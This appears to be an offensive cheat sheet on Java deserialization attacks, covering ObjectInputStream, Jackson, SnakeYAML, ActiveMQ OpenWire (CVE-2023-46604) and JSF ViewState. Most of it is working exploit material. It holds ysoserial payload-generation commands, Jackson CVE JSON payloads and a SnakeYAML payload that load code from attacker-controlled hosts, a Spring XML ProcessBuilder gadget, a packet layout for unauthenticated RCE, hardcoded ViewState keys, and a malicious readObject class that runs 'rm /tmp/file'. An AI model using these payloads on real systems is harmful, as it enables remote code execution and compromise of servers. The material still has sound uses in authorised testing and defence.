# Java Deserialization (ObjectInputStream / Jackson / SnakeYAML)

## When this applies

- Application calls `ObjectInputStream.readObject()` on user-controlled data.
- Jackson JSON deserializer with default typing enabled (`@JsonTypeInfo`).
- SnakeYAML's `Yaml.load()` on untrusted YAML.
- Goal: instantiate a "gadget chain" (CommonsCollections / Spring / etc.) for RCE.

## Technique

Detect via base64 prefix `rO0` (raw ObjectInputStream). For Jackson, look for `com.fasterxml.jackson.databind` errors. Generate payloads with `ysoserial` (binary) or hand-craft Jackson/SnakeYAML JSON/YAML.

## Steps

### Detection

```bash
# Check magic bytes
echo "rO0ABXNy..." | base64 -d | xxd | head
# Output: aced 0005 = Java serialization

# Using Python
python3 -c "import base64; print(base64.b64decode('rO0ABXNy...').hex()[:8])"
# Output: aced0005
```

### ysoserial usage

```bash
# List all payloads
java -jar ysoserial-all.jar

# Common payloads
CommonsCollections1-7   # Apache Commons Collections
CommonsBeanutils1       # Apache Commons Beanutils
Groovy1                 # Groovy
Spring1-2               # Spring Framework
C3P0                    # C3P0 database pool
Jdk7u21                 # JRE <= 1.7u21
Hibernate1-2            # Hibernate ORM

# Generate payload (Java 16+)
java -jar ysoserial-all.jar \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  CommonsCollections4 'rm /tmp/file' | base64

# Generate payload (Java <= 15)
java -jar ysoserial-all.jar CommonsCollections4 'whoami' | base64

# Generate for JNDI injection
java -jar ysoserial-all.jar JRMPClient "attacker.com:1099" | base64

# Using with Burp Collaborator
java -jar ysoserial-all.jar URLDNS "http://burpcollaborator.net" | base64
```

### Common Java gadget chains

**CommonsCollections4 (Most Common):**
```
PriorityQueue.readObject()
  → ChainedTransformer.transform()
    → ConstantTransformer.transform()
      → InvokerTransformer.transform()
        → Runtime.getRuntime().exec(cmd)
```

**Spring1:**
```
SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
  → AnnotationInvocationHandler.invoke()
    → JdkDynamicAopProxy.invoke()
      → ReflectiveMethodInvocation.proceed()
        → Runtime.exec()
```

### Vulnerable libraries

| Library | Versions | ysoserial Payload |
|---------|----------|-------------------|
| Apache Commons Collections | 3.x, 4.0-4.0 | CommonsCollections 1-7 |
| Spring Framework | 4.x, 5.x | Spring1, Spring2 |
| Groovy | 1.7-2.4 | Groovy1 |
| Apache Commons Beanutils | 1.9.x | CommonsBeanutils1 |
| C3P0 | 0.9.5 | C3P0 |
| Hibernate | 4.x, 5.x | Hibernate1, Hibernate2 |
| ROME | 1.0 | ROME |
| Vaadin | 7.7.x | Vaadin1 |

### Jackson JSON deserialization CVEs

**CVE-2017-7525** (Jackson + TemplatesImpl):
```json
{"param":["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  {"transletBytecodes":["yv66v[B64_CLASS]AIAEw=="],
   "transletName":"a.b","outputProperties":{}}]}
```

**CVE-2017-17485** (Spring FileSystemXmlApplicationContext):
```json
{"param":["org.springframework.context.support.FileSystemXmlApplicationContext",
  "http://attacker/spel.xml"]}
```

**CVE-2019-12384** (Logback JDBC → INIT script RCE):
```json
["ch.qos.logback.core.db.DriverManagerConnectionSource",
  {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker:8000/inject.sql'"}]
```

**CVE-2020-36180** (Apache DBCP2):
```json
["org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
  {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker:3333/exec.sql'"}]
```

**Detection:** Send invalid JSON → look for error referencing `com.fasterxml.jackson.databind` or `org.codehaus.jackson.map`.

### Class-Name-As-String Throwable sinks (ActiveMQ OpenWire pattern)

A wider class of pre-auth Java RCEs comes from any binary protocol that unmarshals an "exception" structure by passing the class name string straight into `Class.forName(name).getConstructor(String.class).newInstance(message)`.

**Universal RCE gadget** (Spring on classpath — typical):
- Class: `org.springframework.context.support.ClassPathXmlApplicationContext`
- Constructor `(String)` arg: HTTP/HTTPS URL to attacker-served Spring XML
- Spring fetches the XML, instantiates beans, runs `init-method` on each
- `<bean class="java.lang.ProcessBuilder" init-method="start"><constructor-arg><list><value>bash</value><value>-c</value><value>...</value></list></constructor-arg></bean>` = RCE

**Wire-format packet shape** (binary protocol example, e.g. ActiveMQ OpenWire):
```
[ 4-byte big-endian total length ]
[ 1 byte data-type tag (0x1f = ExceptionResponse on OpenWire) ]
[ 9 bytes commandId / responseRequired / correlationId / has-throwable + has-class-name flags ]
[ 2-byte big-endian length ][ class-name UTF-8 bytes ]
[ 1 byte has-message flag = 0x01 ]
[ 2-byte big-endian length ][ message UTF-8 bytes (= XML URL) ]
```

Send during connection setup — most brokers let an unauthenticated peer push ExceptionResponse before completing the WireFormatInfo handshake.

**CVE-2023-46604** (ActiveMQ < 5.18.3 / 5.17.6 / 5.16.7 / 5.15.16 — port 61616 OpenWire) is the canonical instance. Banner-grab the version.

**Other affected products**: HornetQ / Artemis (TCP/61616), JBoss EAP Remote Naming (4447/4644/9999), JMX RMI servers.

**Public PoC:** evkl1d/CVE-2023-46604, X1r0z/ActiveMQ-RCE.

### SnakeYAML RCE

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

Affected: SnakeYAML, jYAML, YamlBeans.

### JSF ViewState — hardcoded secrets

| Algorithm | Secret (Base64) |
|---|---|
| DES | `NzY1NDMyMTA=` |
| DESede | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| AES CBC | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| AES CBC/PKCS5Padding | `NzY1NDMyMTA3NjU0MzIxMA==` |
| Blowfish | `NzY1NDMyMTA3NjU0MzIxMA` |

**ViewState decode:**
```bash
echo "VALUE" | base64 -d          # server-side (rO0 prefix)
echo "VALUE" | base64 -d | zcat   # client-side (H4sIAAA prefix)
```

**Tools:** `jexboss`, `InYourFace` (JSF ViewState patcher).

### Custom Java exploitation

```java
import java.io.*;

public class Exploit implements Serializable {
    private void readObject(ObjectInputStream in) throws Exception {
        in.defaultReadObject();
        Runtime.getRuntime().exec("rm /tmp/file");
    }
}
```

```java
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(new Exploit());
oos.close();

String encoded = Base64.getEncoder().encodeToString(baos.toByteArray());
System.out.println(encoded);
```

## Verifying success

- ysoserial DNS payload triggers a Burp Collaborator callback.
- Command-execution payload yields out-of-band evidence.
- Jackson CVE returns 500 with the gadget-class name in the stack trace.

## Common pitfalls

- Java 16+ requires `--add-opens` to access internal modules.
- Many libraries use safe-list deserializers — ysoserial alone may not work.
- ActiveMQ 5.x has different banner formats — fingerprint version before exploiting.

## Tools

- ysoserial / ysoserial-all
- jexboss
- Java Deserialization Scanner (Burp BApp)
- Freddy (Burp BApp)
